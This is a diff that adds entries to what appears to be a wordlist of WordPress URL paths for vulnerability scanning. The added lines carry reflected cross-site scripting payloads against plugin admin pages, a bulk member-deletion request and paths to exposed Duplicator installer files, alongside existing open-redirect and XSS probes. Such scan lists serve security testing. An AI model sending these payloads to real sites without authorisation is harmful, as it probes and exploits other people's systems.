@@ -181,3 +181,10 @@
 /wp-admin/admin-ajax.php?page=social-metrics-tracker-export&smt_download_export_file=1
 /wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg
 /wp-content/themes/Grimag/go.php?https://interact.sh
+/wp-admin/admin.php?page=rm_login_advanced&rm_search_value=%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E
+/wp-admin/admin.php?page=rm_login_advanced&rm_search_value=%22%20style=animation-name:rotation%20onanimationstart=alert(/XSS/)//
+/wp-admin/admin.php?page=simple_wp_membership&action=bulk_delete&members[0]=1&members[1]=2
+/wp-admin/admin-ajax.php?image_url=%22onerror=alert(1)%20t=%22
+/wp-admin/admin.php?page=rps_result_batch&edit=%3Cscript%3Ealert(/XSS/)%3C/script%3E
+/wp-content/backups-dup-lite/dup-installer/main.installer.php?view=1
+/wp-content/backups-dup-lite/dup-installer/main.installer.php?debug=1
